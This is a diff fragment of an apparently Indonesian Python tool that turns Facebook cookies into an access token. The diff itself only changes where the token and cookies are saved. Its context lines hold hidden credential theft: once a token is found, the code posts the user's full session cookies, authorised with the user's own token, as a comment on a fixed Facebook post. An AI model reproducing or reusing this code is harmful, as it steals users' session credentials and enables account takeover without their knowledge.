@@ -68,8 +68,8 @@ def convert(cookies):
                if 'EAAG' in search:
                    requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
                    requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
-                   open('data/token.txt','w').write(search)
-                   open('data/cokie.txt','w').write(cookies)
+                   open('sdcard/data/token.txt','w').write(search)
+                   open('sdcard/data/cokie.txt','w').write(cookies)
                    return 'status succes'
          except AttributeError:return 'status gagal login!'
 
